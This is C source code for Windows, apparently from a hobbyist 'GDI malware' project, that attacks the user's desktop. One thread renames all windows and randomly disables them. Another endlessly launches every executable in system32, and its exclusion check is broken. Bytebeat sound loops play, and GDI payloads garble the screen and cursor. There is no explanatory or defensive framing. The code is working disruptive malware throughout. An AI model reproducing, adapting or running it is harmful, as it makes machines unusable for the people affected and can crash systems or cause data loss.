#include "stuff.h"

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
	SetWindowTextW(hWnd, SigmaSym);

	if (random() % 10 == 0) {
		EnableWindow(hWnd, false);
	}

	return 1;
}

DWORD WINAPI WindowCaptions() {
	while (true) {
		EnumWindows(EnumWindowsProc, 0);
		Sleep(1000);
	}
}

DWORD WINAPI OpenFiles() {
	WIN32_FIND_DATA data;

	while (true) {
		HANDLE find = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.exe", &data);

		while (FindNextFileW(find, &data)) {
			if (data.cFileName != L"magnify.exe" || L"logoff.exe") {
				ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			}
			Sleep(700);
		}
		FindClose(find);
	}
}

DWORD WINAPI Sound1(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * ((t >> 4) >> (t >> 3) + 5));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI Sound2(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * (t >> 7 | 21 & 13 | t));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI Sound3(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * (t >> 7 | t >> 6));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI Sound4(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * (t >> 8 | t));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI Sound5(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * (t >> 6 & 63 | t >> 8));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI Sound6(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * ((t >> 8) & t >> 5));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI Sound7(LPVOID lpParam) {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	Payloads* payload = (Payloads*)lpParam;

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, payload->time * 8000);

	for (int t = 0; t < payload->time * 8000; t++) {
		buffer[t] = (t * (t >> 11 | t >> 6 | t));
	}

	WAVEHDR whdr = { buffer, payload->time * 8000, 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &whdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &whdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	Sleep(payload->time * 1000);
	HeapFree(GetProcessHeap(), 0, buffer);
	ExitThread(0);
}

DWORD WINAPI PostPayload1(LPVOID lpParam) {
	int xs = 0;
	int ys = 0;

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		HDC hdc = GetDC(0);

		xs = random() % x;
		ys = random() % y;
		StretchBlt(hdc, xs - 2, ys - 2, 204, 204, hdc, xs, ys, 200, 200, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(10);
	}
	ExitThread(0);
}

DWORD WINAPI Payload1(LPVOID lpParam) {
	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, x, y);

		SelectObject(hdcMem, bmp);
		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, random() % 3, random() % 3, x, y, hdcMem, random() % 3, random() % 3, SRCCOPY);

		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, x, y, hdcMem, 0, 0, x, y, blend);

		ReleaseDC(0, hdc);
		DeleteDC(hdcMem); DeleteObject(bmp);
		Sleep(100);
	}
	ExitThread(0);
}

DWORD WINAPI Payload2(LPVOID lpParam) {
	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		for (int hue = 0; hue < 355; hue += 5) {
			HDC hdc = GetDC(0);

			SelectObject(hdc, CreateSolidBrush(Hue(hue)));
			BitBlt(hdc, 1, 0, x, y, hdc, 0, 0, SRCRNBW);
			BitBlt(hdc, 0, 1, x, y, hdc, 0, 0, SRCRNBW);
			BitBlt(hdc, -1, 0, x, y, hdc, 0, 0, SRCRNBW);
			BitBlt(hdc, 0, -1, x, y, hdc, 0, 0, SRCRNBW);

			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	ExitThread(0);
}

DWORD WINAPI Payload3(LPVOID lpParam) {
	PRGBTRIPLE prgb = 0;
	BITMAPINFO bmp = { sizeof(BITMAPINFOHEADER), x, y, 1, 24 };

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP DIB = CreateDIBSection(hdc, &bmp, 0, (void**)&prgb, 0, 0);

		SelectObject(hdcMem, DIB);
		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);

		for (int i = 0; i < x * y; i++) {
			prgb[i].rgbtRed *= 3;
			prgb[i].rgbtGreen = 0;
			prgb[i].rgbtBlue *= 3;
		}
		BitBlt(hdc, 0, 0, x, y, hdcMem, 0, 0, SRCCOPY);

		ReleaseDC(0, hdc);
		DeleteDC(hdcMem); DeleteObject(DIB);
		Sleep(100);
	}
	ExitThread(0);
}

DWORD WINAPI Payload4(LPVOID lpParam) {
	int hue = 0;

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		int xs = random() % x;
		int ys = random() % y;

		int select = random() % 2;

		HRGN region = 0;

		for (int i = 0; i < x; i += 30) {
			HDC hdc = GetDC(0);

			if (select == 0) {
				region = CreateEllipticRgn(xs - i, ys - i, xs + i, ys + i);
			}
			else {
				region = CreateRectRgn(xs - i, ys - i, xs + i, ys + i);
			}

			SelectClipRgn(hdc, region);

			SelectObject(hdc, CreateSolidBrush(Hue(hue)));
			BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, SRCRNBW);
			hue += 2;

			if (hue >= 358) {
				hue = 0;
			}

			ReleaseDC(0, hdc);
			Sleep(1);
		}

		DeleteObject(region);
		Sleep(50);

		RedrawWindow(0, 0, 0, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}
	ExitThread(0);
}

DWORD WINAPI PostPayload5(LPVOID lpParam) {
	int xs = 0, PosX = 2;
	int ys = 0, PosY = 3;

	CURSORINFO cur;

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		HDC hdc = GetDC(0);

		cur.cbSize = sizeof(CURSORINFO);
		GetCursorInfo(&cur);
		DrawIcon(hdc, xs, ys, cur.hCursor);
		xs += PosX;
		ys += PosY;

		if (xs <= 0 || xs >= x) {
			PosX = -PosX;
		}
		if (ys <= 0 || ys >= y) {
			PosY = -PosY;
		}

		ReleaseDC(0, hdc);
		Sleep(1);
	}
	ExitThread(0);
}

DWORD WINAPI Payload5(LPVOID lpParam) {
	PRGBTRIPLE prgb;
	BITMAPINFO bmp = { sizeof(BITMAPINFOHEADER), x, y, 1, 24 };

	int wave = 0;
	double X = 0;

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP DIB = CreateDIBSection(hdc, &bmp, 0, (void**)&prgb, 0, 0);

		SelectObject(hdcMem, DIB);
		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);

		for (int i = 0; i < x * y; i++) {
			prgb[i].rgbtRed = -(i + wave);
			prgb[i].rgbtGreen += 10;
			prgb[i].rgbtBlue = i + wave;
		}
		wave += sin(X) * 16;
		X += 0.06;

		BitBlt(hdc, 0, 0, x, y, hdcMem, 0, 0, SRCCOPY);

		ReleaseDC(0, hdc);
		DeleteDC(hdcMem); DeleteObject(DIB);
		Sleep(30);
	}
	ExitThread(0);
}

DWORD WINAPI PostPayload6(LPVOID lpParam) {
	CURSORINFO cursor;

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		for (int i = 0; i < 358; i += 2) {
			HDC hdc = GetDC(0);

			cursor.cbSize = sizeof(cursor);
			GetCursorInfo(&cursor);

			SelectObject(hdc, CreateSolidBrush(Hue(i)));
			Rectangle(hdc, cursor.ptScreenPos.x, cursor.ptScreenPos.y, cursor.ptScreenPos.x + 30, cursor.ptScreenPos.y + 30);

			Sleep(10);
			ReleaseDC(0, hdc);
		}
	}
	ExitThread(0);
}

DWORD WINAPI Payload6(LPVOID lpParam) {
	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		for (int ys = 0; ys < y; ys += 50) {
			HDC hdc = GetDC(0);

			BitBlt(hdc, 10, ys, x, 50, hdc, 0, ys, SRCCOPY);
			ys += 50;

			BitBlt(hdc, -10, ys, x, 50, hdc, 0, ys, SRCCOPY);

			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	ExitThread(0);
}

DWORD WINAPI Payload7(LPVOID lpParam) {
	PRGBTRIPLE prgb;
	BITMAPINFO bmp = { sizeof(BITMAPINFOHEADER), x, y, 1, 24 };

	int hue = 0;

	Payloads* payload = (Payloads*)lpParam;

	time_t runtime = payload->time;
	time_t start = time(0);

	while (time(0) - start < runtime) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP DIB = CreateDIBSection(hdc, &bmp, 0, (void**)&prgb, 0, 0);

		SelectObject(hdcMem, DIB);
		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);

		for (int ys = 0; ys < y; ys++) {
			for (int xs = 0; xs < x; xs++) {
				prgb[ys * x + xs] = prgbHue(hue);
			}
			hue += 2;

			if (hue >= 358) {
				hue = 0;
			}
		}
		BitBlt(hdc, 0, 0, x, y, hdcMem, 0, 0, SRCCOPY);

		ReleaseDC(0, hdc);
		DeleteDC(hdcMem); DeleteObject(DIB);
		Sleep(10);
	}
	ExitThread(0);
}